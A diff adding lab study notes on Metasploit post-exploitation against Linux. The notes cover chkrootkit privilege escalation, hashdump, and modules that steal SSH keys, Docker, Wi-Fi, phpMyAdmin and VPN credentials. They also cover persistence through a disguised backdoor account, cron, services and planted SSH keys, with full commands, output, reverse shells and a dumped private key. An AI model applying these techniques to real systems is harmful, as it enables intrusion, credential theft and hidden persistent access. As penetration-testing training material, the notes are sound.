@@ -61,6 +61,7 @@
     - Linux Post Exploitation Modules
     - Exploiting A Vulnerable Program    
     - Dumping Hashes With Hashdump    
+    - Establishing Persistence On Linux    
 
 - ##### Armitage
 
@@ -4892,12 +4893,946 @@ uid=0(root) gid=0(root) groups=0(root)
 
 
 
+---
+
+#### Exploiting A Vulnerable Program    
+
++ The privilege escalation techniques we can utilize will depend on the version of the Linux kernel running on the target system as well as the distribution release version.
++ MSF offers very little in regards to Linux kernel exploit modules, however, in some cases, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate our privileges.
+
+
+
+The chkrootkit rootkit scanner is running as root in every 60 seconds. Check the chkrootkit location and it’s version
+
+```
+jackie@victim-1:~$ cat /bin/check-down
+cat /bin/check-down
+#!/bin/bash
+while :
+do
+        /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
+        sleep 60
+done
+jackie@victim-1:~$ ls -la /bin/check-down
+ls -la /bin/check-down
+-rwxr-xr-x 1 root root 96 Nov  6  2019 /bin/check-down
+jackie@victim-1:~$ chkrootkit -v
+chkrootkit -v
+Usage: /bin/chkrootkit [options] [test ...]
+Options:
+        -h                show this help and exit
+        -V                show version information and exit
+        -l                show available tests and exit
+        -d                debug
+        -q                quiet mode
+        -x                expert mode
+        -r dir            use dir as the root directory
+        -p dir1:dir2:dirN path for the external commands used by chkrootkit
+        -n                skip NFS mounted dirs
+jackie@victim-1:~$ chkrootkit -V
+chkrootkit -V
+chkrootkit version 0.49
+```
+
+We found the chkrootkit binary location and it’s version. Searching privilege escalation exploit module for chkrootkit 0.49.
+
+
+
+**exploit chkrootkit 0.49**
+
+```bash
+msf5 > search chkrootkit
+
+Matching Modules
+================
+
+   #  Name                           Disclosure Date  Rank    Check  Description
+   -  ----                           ---------------  ----    -----  -----------
+   0  exploit/unix/local/chkrootkit  2014-06-04       manual  Yes    Chkrootkit Local Privilege Escalation
+
+
+msf5 > use exploit/unix/local/chkrootkit
+msf5 exploit(unix/local/chkrootkit) > options 
+
+Module options (exploit/unix/local/chkrootkit):
+
+   Name        Current Setting       Required  Description
+   ----        ---------------       --------  -----------
+   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
+   SESSION                           yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+msf5 auxiliary(scanner/ssh/ssh_login) > use unix/local/chkrootkit
+msf5 exploit(unix/local/chkrootkit) > options 
+
+Module options (exploit/unix/local/chkrootkit):
+
+   Name        Current Setting       Required  Description
+   ----        ---------------       --------  -----------
+   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
+   SESSION                           yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(unix/local/chkrootkit) > set SESSION 2
+SESSION => 2
+
+
+msf5 exploit(unix/local/chkrootkit) > 
+msf5 exploit(unix/local/chkrootkit) > set CHKROOTKIT /bin/chkrootkit
+CHKROOTKIT => /bin/chkrootkit
+
+msf5 exploit(unix/local/chkrootkit) > set LHOST eth1
+LHOST => eth1
+msf5 exploit(unix/local/chkrootkit) > run
+
+[*] Started reverse TCP double handler on 192.179.136.2:4444 
+[!] Rooting depends on the crontab (this could take a while)
+[*] Payload written to /tmp/update
+[*] Waiting for chkrootkit to run via cron...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo dMfZaBRobq3HknpD;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "dMfZaBRobq3HknpD\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 3 opened (192.179.136.2:4444 -> 192.179.136.3:32838) at 2024-02-06 17:05:27 +0000
+[+] Deleted /tmp/update
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+
+
+
+---
+
+#### Dumping Hashes With Hashdump    
+
++ We can dump Linux user hashes with the hashdump post exploitation module.
++ Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.
++ The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with John the Ripper.
++ 
+
+**list of post exploitation modules that you can run on a linux machine to dump hashes and credientials**
+
+- post/multi/gather/ssh_creds
+- post/multi/gather/docker_creds
+- post/linux/gather/hashdump
+- post/linux/gather/ecryptfs_creds
+- post/linux/gather/enum_psk
+- post/linux/gather/enum_xchat
+- post/linux/gather/phpmyadmin_credsteal
+- post/linux/gather/pptpd_chap_secrets
+- post/linux/manage/sshkey_persistence
+
+
+
+**dump linux system hashes `post/linux/gather/hashdump`**
+
+Post Module to dump the password hashes for all users on a Linux System
+
+```bash
+msf5 > use post/linux/gather/hashdump
+msf5 post(linux/gather/hashdump) > options 
+
+Module options (post/linux/gather/hashdump):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(linux/gather/hashdump) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/hashdump) > run
+
+[+] Unshadowed Password File: /root/.msf4/loot/20240206173554_default_192.100.193.3_linux.hashes_191344.txt
+[*] Post module execution completed
+msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20240206173554_default_192.100.193.3_linux.hashes_191344.txt
+[*] exec: cat /root/.msf4/loot/20240206173554_default_192.100.193.3_linux.hashes_191344.txt
+
+msf5 post(linux/gather/hashdump) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                   Connection
+  --  ----  ----                   -----------                                   ----------
+  1         shell cmd/unix                                                       192.100.193.2:43117 -> 192.100.193.3:445 (192.100.193.3)
+  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.100.193.3  192.100.193.2:4433 -> 192.100.193.3:50012 (192.100.193.3)
+
+msf5 post(linux/gather/hashdump) > run
+
+[+]root:$6$6bbBWMNV$ZlgU4gQ95fhc4qg1e.wG/cFnWe3B4dqBt0.QHxX9HCylKRiJHgTktyR1T.wTAfjmF9k8erEaBJx/aHuVbApaP1:0:0:root:/root:/bin/bash
+[+] Unshadowed Password File: /root/.msf4/loot/20240206174232_default_192.100.193.3_linux.hashes_262042.txt
+[*] Post module execution completed
+```
+
+
+
+```bash
+root@attackdefense:~/.msf4/loot# cat 20240206173554_default_192.100.193.3_linux.passwd_114007.txt
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+colord:x:105:112:colord colour management daemon,,,:/var/lib/colord:/bin/false
+saned:x:106:113::/var/lib/saned:/bin/false
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+
+
+
+root@attackdefense:~/.msf4/loot# cat 20240206173554_default_192.100.193.3_linux.shadow_628844.txt
+root:$6$6bbBWMNV$ZlgU4gQ95fhc4qg1e.wG/cFnWe3B4dqBt0.QHxX9HCylKRiJHgTktyR1T.wTAfjmF9k8erEaBJx/aHuVbApaP1:0:0:root:/root:/bin/bash
+daemon:*:17774:0:99999:7:::
+colord:*:17812:0:99999:7:::
+saned:*:17812:0:99999:7:::
+usbmux:*:17812:0:99999:7:::
+```
 
 
 
 
 
+**gather ssh keys `post/multi/gather/ssh_creds`**
 
-Exploiting A Vulnerable Program    
+This module will collect the contents of all users' .ssh directories on the targeted machine. Additionally, known_hosts and authorized_keys and any other files are also downloaded. This module is largely based on firefox_creds.rb.
 
-Dumping Hashes With Hashdump    
+```bash
+msf5 post(linux/gather/hashdump) > use post/multi/gather/ssh_creds
+msf5 post(multi/gather/ssh_creds) > options 
+
+Module options (post/multi/gather/ssh_creds):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(multi/gather/ssh_creds) > set SESSION 2
+SESSION => 2
+msf5 post(multi/gather/ssh_creds) > run
+
+[*] Finding .ssh directories
+[*] Looting 1 directories
+[+] Downloaded /root/.ssh/id_rsa.pub -> /root/.msf4/loot/20240206174658_default_192.100.193.3_ssh.id_rsa.pub_315472.txt
+[-] Could not load SSH Key: Neither PUB key nor PRIV key
+[+] Downloaded /root/.ssh/id_rsa -> /root/.msf4/loot/20240206174658_default_192.100.193.3_ssh.id_rsa_291752.txt
+[-] Could not load SSH Key: Neither PUB key nor PRIV key
+[+] Downloaded /root/.ssh/authorized_keys -> /root/.msf4/loot/20240206174658_default_192.100.193.3_ssh.authorized_k_975514.txt
+[-] Could not load SSH Key: Neither PUB key nor PRIV key
+[+] Downloaded /root/.ssh/known_hosts -> /root/.msf4/loot/20240206174658_default_192.100.193.3_ssh.known_hosts_656909.txt
+[-] Could not load SSH Key: Neither PUB key nor PRIV key
+[*] Post module execution completed
+```
+
+
+
+**gather information from docker directory `post/multi/gather/docker_creds`**
+
+This module will collect the contents of all users' .docker directories on the targeted machine. If the user has already push to docker hub, chances are that the password was saved in base64 (default behavior).
+
+```bash
+msf5 post(multi/gather/ssh_creds) > use post/multi/gather/docker_creds
+msf5 post(multi/gather/docker_creds) > set SESSION 2
+SESSION => 2
+msf5 post(multi/gather/docker_creds) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Finding .docker directories
+[*] Looting 1 directories
+[*] Downloading /root/.docker/config.json -> config.json
+[+] Found attackdefence:Str0ngPassword@123
+[+] Saved credentials
+[*] Post module execution completed
+```
+
+
+
+**gather information from  .ecrypts directories `post/linux/gather/ecryptfs_creds`**
+
+This module will collect the contents of all users' .ecrypts directories on the targeted machine. Collected "wrapped-passphrase" files can be cracked with John the Ripper (JtR) to recover "mount passphrases".
+
+```bash
+msf5 post(multi/gather/docker_creds) > use post/linux/gather/ecryptfs_creds
+msf5 post(linux/gather/ecryptfs_creds) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/ecryptfs_creds) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Finding .ecryptfs directories
+[*] Looting 1 directories
+[*] Downloading /root/.ecryptfs/sig-cache.txt -> sig-cache.txt
+[+] File stored in: /root/.msf4/loot/20240206174857_default_192.100.193.3_ecryptfs.sigcac_727805.txt
+[*] Post module execution completed
+```
+
+
+
+**gather Wireless-Security credentials `post/linux/gather/enum_psk`**
+
+This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. The module gathers NetworkManager's plaintext "psk" information.
+
+```bash
+msf5 post(linux/gather/ecryptfs_creds) > use post/linux/gather/enum_psk
+msf5 post(linux/gather/enum_psk) > options 
+
+Module options (post/linux/gather/enum_psk):
+
+   Name     Current Setting                          Required  Description
+   ----     ---------------                          --------  -----------
+   DIR      /etc/NetworkManager/system-connections/  yes       The default path for network connections
+   SESSION                                           yes       The session to run this module on.
+
+msf5 post(linux/gather/enum_psk) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/enum_psk) > run
+
+[*] Reading file /etc/NetworkManager/system-connections/TopSecret_Network
+[*] Reading file /etc/NetworkManager/system-connections/Wi-Fi connection 1
+[*] Reading file /etc/NetworkManager/system-connections/Wi-Fi connection 2
+
+802-11-wireless-security
+========================
+
+ AccessPoint-Name    PSK
+ ----------------    ---
+ Wi-Fi connection 1  AttackDefence_WiFi_123321
+ Wi-Fi connection 2  Free_Internet
+
+[+] Secrets stored in: /root/.msf4/loot/20240206174933_default_192.100.193.3_linux.psk.creds_748703.txt
+[*] Done
+[*] Post module execution completed
+```
+
+
+
+**gather information from docker directory `post/linux/gather/enum_xchat`**
+
+This module will collect XChat's config files and chat logs from the victim's machine. There are three actions you may choose: CONFIGS, CHATS, and ALL. The CONFIGS option can be used to collect information such as channel settings, channel/server passwords, etc. The CHATS option will simply download all the .log files
+
+```bash
+msf5 post(linux/gather/enum_psk) > use post/linux/gather/enum_xchat
+msf5 post(linux/gather/enum_xchat) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/enum_xchat) > run
+
+[+] 192.100.193.3:50012 - servlist_.conf saved as /root/.msf4/loot/20240206175028_default_192.100.193.3_xchat.config_216713.txt
+[+] 192.100.193.3:50012 - xchat.conf saved as /root/.msf4/loot/20240206175028_default_192.100.193.3_xchat.config_737142.txt
+[*] Post module execution completed
+```
+
+
+
+**gather Phpmyadmin credentials `post/linux/gather/phpmyadmin_credsteal`**
+
+This module gathers Phpmyadmin creds from target linux machine
+
+```bash
+msf5 post(linux/gather/enum_xchat) > use post/linux/gather/phpmyadmin_credsteal
+msf5 post(linux/gather/phpmyadmin_credsteal) > options 
+
+Module options (post/linux/gather/phpmyadmin_credsteal):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(linux/gather/phpmyadmin_credsteal) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/phpmyadmin_credsteal) > run
+
+
+PhpMyAdmin Creds Stealer!
+
+[+] PhpMyAdmin config found!
+[+] Extracting creds
+[+] User: root
+[+] Password: N0tE@syT0Guess!!
+[*] Storing credentials...
+[+] Config file located at /root/.msf4/loot/20240206175113_default_192.100.193.3_phpmyadmin_conf_257958.txt
+[*] Post module execution completed
+```
+
+
+
+**gather VPN information `post/linux/gather/pptpd_chap_secrets`**
+
+This module collects PPTP VPN information such as client, server, password, and IP from your target server's chap-secrets file.
+
+```
+msf5 post(linux/gather/phpmyadmin_credsteal) > use post/linux/gather/pptpd_chap_secrets
+msf5 post(linux/gather/pptpd_chap_secrets) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/pptpd_chap_secrets) > run
+
+PPTPd chap-secrets
+==================
+
+ Client  Server                Secret          IP
+ ------  ------                ------          --
+ jackie  attackdefense.com     HiddenNetwork   10.10.10.10
+ ninja   pentesteracademy.com  LearningIsReal  216.146.39.125
+ peter   underground.onion     ReallySecure!!  246.234.63.133
+
+[+] Secrets stored in: /root/.msf4/loot/20240206175141_default_192.100.193.3_linux.chapsecret_098648.txt
+[*] Post module execution completed
+```
+
+
+
+**add an SSH key to a specified user `post/linux/manage/sshkey_persistence`**
+
+ This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time.
+
+```bash
+msf5 post(linux/gather/hashdump) > use post/linux/manage/sshkey_persistence
+msf5 post(linux/manage/sshkey_persistence) > options 
+
+Module options (post/linux/manage/sshkey_persistence):
+
+   Name             Current Setting       Required  Description
+   ----             ---------------       --------  -----------
+   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
+   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
+   SESSION                                yes       The session to run this module on.
+   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
+   USERNAME                               no        User to add SSH key to (Default: all users on box)
+
+msf5 post(linux/manage/sshkey_persistence) > set SESSION 2
+SESSION => 2
+msf5 post(linux/manage/sshkey_persistence) > run
+
+[*] Checking SSH Permissions
+[-] Failed to open file: /etc/ssh/sshd_config: core_channel_open: Operation failed: 1
+[*] Authorized Keys File: .ssh/authorized_keys
+[*] Finding .ssh directories
+[+] Storing new private key as /root/.msf4/loot/20240206175503_default_192.100.193.3_id_rsa_245261.txt
+[*] Adding key to /root/.ssh/authorized_keys
+[+] Key Added
+[*] Post module execution completed
+```
+
+
+
+---
+
+#### Establishing Persistence On Linux
+
++ Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
++ Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
++ The persistence techniques we can utilize will depend on the target configuration.
++ We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.
+
+
+
+**1- create backdoor user**
+
+add new user that looks like a service account with root privilege and set userid and groupid with a small value like a service account to avoid detection
+
+```bash
+root@victim-1:~# useradd -m ftp -s /bin/bash
+useradd -m ftp -s /bin/bash
+
+root@victim-1:~# passwd ftp
+passwd ftp
+Enter new UNIX password: password123
+Retype new UNIX password: password123
+passwd: password updated successfully
+
+root@victim-1:~# tail -n 1 /etc/passwd
+tail -n 1 /etc/passwd
+ftp:x:1001:1001::/home/ftp:/bin/bash
+
+root@victim-1:~# usermod -aG root ftp
+usermod -aG root ftp
+
+root@victim-1:~# groups ftp
+groups ftp
+ftp : ftp root
+
+root@victim-1:~# usermod -u 15 ftp
+usermod -u 15 ftp
+
+root@victim-1:~# tail -n 1 /etc/passwd
+tail -n 1 /etc/passwd
+ftp:x:15:1001::/home/ftp:/bin/bash
+
+root@victim-1:~# usermod -g 15 ftp                
+usermod -g 15 ftp
+
+root@victim-1:~# tail -n 1 /etc/passwd
+tail -n 1 /etc/passwd
+ftp:x:15:15::/home/ftp:/bin/bash
+```
+
+
+
+
+
+**2- list of metasploit  persistence modules**
+
+```bash
+msf5 exploit(unix/local/chkrootkit) > search persistence platform:linux
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
+   1  exploit/linux/local/autostart_persistence            2006-02-13       excellent  No     Autostart Desktop Item Persistence
+   2  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   3  exploit/linux/local/cron_persistence                 1979-07-01       excellent  No     Cron Persistence
+   4  exploit/linux/local/rc_local_persistence             1980-10-01       excellent  No     rc.local Persistence
+   5  exploit/linux/local/service_persistence              1983-01-01       excellent  No     Service Persistence
+   6  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
+   7  post/linux/manage/sshkey_persistence                                  excellent  No     SSH Key Persistence
+```
+
+
+
+**using `exploit/linux/local/cron_persistence`**
+
+```bash
+msf5 exploit(unix/local/chkrootkit) > use exploit/linux/local/cron_persistence
+msf5 exploit(linux/local/cron_persistence) > options 
+
+Module options (exploit/linux/local/cron_persistence):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CLEANUP   true             yes       delete cron entry after execution
+   SESSION                    yes       The session to run this module on.
+   TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
+   USERNAME  root             no        User to run cron/crontab as
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   User Crontab
+
+
+msf5 exploit(linux/local/cron_persistence) > set SESSION 4
+SESSION => 4
+msf5 exploit(linux/local/cron_persistence) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                                    Connection
+  --  ----  ----                   -----------                                                                    ----------
+  1         shell unknown          SSH jackie:password (192.165.212.3:22)                                         192.165.212.2:33761 -> 192.165.212.3:22 (192.165.212.3)
+  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.165.212.3  192.165.212.2:4433 -> 192.165.212.3:59296 (192.165.212.3)
+  3         shell cmd/unix                                                                                        192.165.212.2:4444 -> 192.165.212.3:36282 (192.165.212.3)
+  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.165.212.3              192.165.212.2:4433 -> 192.165.212.3:42402 (192.165.212.3)
+
+msf5 exploit(linux/local/cron_persistence) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 10.1.0.26:4444 
+[-] Failed to open file: /etc/cron.allow: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/cron.deny: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/cron.d/cron.allow: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/cron.d/cron.deny: core_channel_open: Operation failed: 1
+[*] Waiting 90sec for execution
+^C[-] Exploit failed [user-interrupt]: Interrupt 
+[-] run: Interrupted
+msf5 exploit(linux/local/cron_persistence) > options 
+
+Module options (exploit/linux/local/cron_persistence):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CLEANUP   true             yes       delete cron entry after execution
+   SESSION   4                yes       The session to run this module on.
+   TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
+   USERNAME  root             no        User to run cron/crontab as
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.1.0.26        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   User Crontab
+
+
+msf5 exploit(linux/local/cron_persistence) > set LPORT 4111
+LPORT => 4111
+msf5 exploit(linux/local/cron_persistence) > set LHOST eth1
+LHOST => eth1
+msf5 exploit(linux/local/cron_persistence) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 192.165.212.2:4111 
+[-] Failed to open file: /etc/cron.allow: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/cron.deny: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/cron.d/cron.allow: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/cron.d/cron.deny: core_channel_open: Operation failed: 1
+[*] Waiting 90sec for execution
+```
+
+
+
+**using `exploit/linux/local/service_persistence `**
+
+```bash
+msf5 exploit(linux/local/cron_persistence) > use exploit/linux/local/service_persistence 
+msf5 exploit(linux/local/service_persistence) > options 
+
+Module options (exploit/linux/local/service_persistence):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SERVICE                      no        Name of service to create
+   SESSION                      yes       The session to run this module on.
+   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
+   SHELL_NAME                   no        Name of shell file to write
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Auto
+
+
+msf5 exploit(linux/local/service_persistence) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                                    Connection
+  --  ----  ----                   -----------                                                                    ----------
+  1         shell unknown          SSH jackie:password (192.165.212.3:22)                                         192.165.212.2:33761 -> 192.165.212.3:22 (192.165.212.3)
+  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.165.212.3  192.165.212.2:4433 -> 192.165.212.3:59296 (192.165.212.3)
+  3         shell cmd/unix                                                                                        192.165.212.2:4444 -> 192.165.212.3:36282 (192.165.212.3)
+  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.165.212.3              192.165.212.2:4433 -> 192.165.212.3:42402 (192.165.212.3)
+
+msf5 exploit(linux/local/service_persistence) > set SESSION 4
+SESSION => 4
+msf5 exploit(linux/local/service_persistence) > set PAYLOAD cmd/unix/reverse_python
+PAYLOAD => cmd/unix/reverse_python
+msf5 exploit(linux/local/service_persistence) > set LHOST eth1
+LHOST => eth1
+msf5 exploit(linux/local/service_persistence) > set LPORT 4141
+LPORT => 4141
+msf5 exploit(linux/local/service_persistence) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 192.165.212.2:4141 
+[*] Utilizing systemd
+[*] Utilizing Upstart
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: 1
+[*] Exploit completed, but no session was created.
+```
+
+
+
+
+
+**add ssh keys in the target machine (recommended)**
+
+This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time. you will have one private key that is valid for all users and you can login with the private key to any user on the system.
+
+```bash
+msf5 exploit(linux/local/service_persistence) > use post/linux/manage/sshkey_persistence
+msf5 post(linux/manage/sshkey_persistence) > info
+
+       Name: SSH Key Persistence
+     Module: post/linux/manage/sshkey_persistence
+   Platform: Linux
+       Arch: 
+       Rank: Excellent
+
+Provided by:
+  h00die <mike@shorebreaksecurity.com>
+
+Compatible session types:
+  Meterpreter
+  Shell
+
+Basic options:
+  Name             Current Setting       Required  Description
+  ----             ---------------       --------  -----------
+  CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
+  PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
+  SESSION                                yes       The session to run this module on.
+  SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
+  USERNAME                               no        User to add SSH key to (Default: all users on box)
+
+Description:
+  This module will add an SSH key to a specified user (or all), to 
+  allow remote login via SSH at any time.
+
+msf5 post(linux/manage/sshkey_persistence) > set CREATESSHFOLDER true 
+CREATESSHFOLDER => true
+msf5 post(linux/manage/sshkey_persistence) > set SESSION 4
+SESSION => 4
+msf5 post(linux/manage/sshkey_persistence) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                                    Connection
+  --  ----  ----                   -----------                                                                    ----------
+  1         shell unknown          SSH jackie:password (192.165.212.3:22)                                         192.165.212.2:33761 -> 192.165.212.3:22 (192.165.212.3)
+  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.165.212.3  192.165.212.2:4433 -> 192.165.212.3:59296 (192.165.212.3)
+  3         shell cmd/unix                                                                                        192.165.212.2:4444 -> 192.165.212.3:36282 (192.165.212.3)
+  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.165.212.3              192.165.212.2:4433 -> 192.165.212.3:42402 (192.165.212.3)
+
+msf5 post(linux/manage/sshkey_persistence) > run
+
+[*] Checking SSH Permissions
+[*] Authorized Keys File: .ssh/authorized_keys
+[*] Finding .ssh directories
+[*] Creating /bin/.ssh folder
+[*] Creating /dev/.ssh folder
+[*] Creating /home/ftp/.ssh folder
+[*] Creating /home/ftp
+/.ssh folder
+[*] Creating /home/jackie/.ssh folder
+[*] Creating /nonexistent/.ssh folder
+[*] Creating /var/spool/news/.ssh folder
+[*] Creating /var/spool/uucp/.ssh folder
+[*] Creating /var/www/.ssh folder
+[+] Storing new private key as /root/.msf4/loot/20240206191128_default_192.165.212.3_id_rsa_471419.txt
+[*] Adding key to /bin/.ssh/authorized_keys
+[+] Key Added
+[*] Adding key to /dev/.ssh/authorized_keys
+[+] Key Added
+[*] Adding key to /home/ftp/.ssh/authorized_keys
+[+] Key Added
+[*] Adding key to /home/jackie/.ssh/authorized_keys
+[+] Key Added
+[*] Adding key to /nonexistent/.ssh/authorized_keys
+[+] Key Added
+[*] Adding key to /root/.ssh/authorized_keys
+[+] Key Added
+[*] Adding key to /var/spool/uucp/.ssh/authorized_keys
+[+] Key Added
+[*] Adding key to /var/www/.ssh/authorized_keys
+[+] Key Added
+[*] Post module execution completed
+
+
+root@attackdefense:~# cat /root/.msf4/loot/20240206191128_default_192.165.212.3_id_rsa_471419.txt
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAq4oLn9ivFAfAAmnv7BQlwdAZvkRDwe7AQyj1QsvvQE6IlyTw
+vmDrgBAvWli7DZw/qQOoD+ty/QuWkfiSnRUDpVgp9wHF3XFG5zVxnFQQnRZu9a/y
+Pmsjt+/I8PNivYw4hFfj6u8UYobss/LszHwtmGLlACW3DmiS5JiZh1axQKoaEKtG
+vRaAS0bzwJ6l/br9HCfc8gZKJokfGuR33Q+N6paXlOZnZRgM6sqhtqyp083PizuU
+eDWLsXVRhh2gHsni2I7uLTrBLBeIEjUtc1EvGt3cdMTMVjcx1f6XyM2dK99eLH4Z
+WGvQ1T2enyftGxXhb6h9etoNwx7PWQOby9L1ZwIDAQABAoIBAHla4/ZluRaWlQQg
+JhgB+OQwcMXmTXk5itL4euqSk+QOqxsiix5kOrcSvC1ScKKkU3UinRcGHwdd11vV
+WwO+BiJHSQjyPCT5KowPhxxtbIN1h3JQ0zPNYCuUe7fat5QZSzJ1a0ydbvJ1Oafk
+yBmyEB+qdw+vnt2WpbULMDJK5oMzqxM7ghQYOVJtwj48nw0rzN21tg21iHn3UhQc
+oVMuQVnhRXtCDisVfuBtjqKv8faRuaIpsAU2RdBnVNQxI64AKBm5dHJ7hElUpPWU
+UdKLduq9DDRvNUqGckE3E1HNOHahotxR0stndSM15iZoAlM/Gj6HAai3+k6UjlFs
+xxjg9qECgYEA2l1LBShn1mndkUcTmUm+k8wpJkDmec3lPoI03UnXO/EN5rEefFgk
+bXZXgpDaBYz4B9pXIP+Zh26FUIDtjWq4leWG5LOcNH2+Yycsn3sUgbrbw6/+axyE
+wIIDA/QZa7FmDZT+5Fb8URiO9MOjKvhkpkKC62pv2nGfiPZu5UCJAQ0CgYEAyRq5
+hV1/nMTQsyIcTYQQw3Wo3cPxpE8wO/hCd+xLqinupNmUZ88GKhQm4rgEwGDgVglZ
+2UWk5pAfQu2Fz+Am/+cTAHbb2GM0xyDT/jIHfGA6r+rxZNwp8j8aoKh2YkR2Nuq8
+Uv3jqztfnB5F4AtRPJpbCjxyC+FqnpYGQTxUq0MCgYAIOSMuGotug6YYZnjSePh4
+UGPsUN1dEOflJroe6zzzwOwpF9pyDE+y35YEELhlJR3iDdLiJz3836idk31eqfox
+iuc9jZYAVAvrZ/pCNzxadlL4V5RZLEXDiiHa8EJUz+Vr9YRzzOLLmwUnKobmg1wm
+9rI/c06rB0RewAkFER0XsQKBgB7oFIsCi5I0TT66h08CdPEVLBao/oIaCXet98km
+b5p/R0XeiohJsNDWuAMv9Mr8GH4ggcZ6hZVJoQRQLLh94oCBqtHvcmoXFQ1lZi8y
+0SO0RlCy8tZlX6zzNcxrF4aSrvhRqw+2JT8zqMX9gQ+lrZ56unMgRwa8Zf5pYBy2
+gOyxAoGBAMip7fER68CGzBqQ2s+G9i/2xQkwex9gXpcIT0smWE7X0H2/shCTUB3C
+D0wtmNRbFpsI22H1ZEY49G6roKdTqh198KzW/F7+5BnEeURtqYCQRYk4t2yNARsA
+dMEXoWxGPc6LAjRkLiedjgyQ3Awmuwl8O6EH48Zs53ow9Iu+EaQ1
+-----END RSA PRIVATE KEY-----
+
+
+========================================
+login with the private key as a root
+========================================
+root@attackdefense:~# chmod 600 id_rsa 
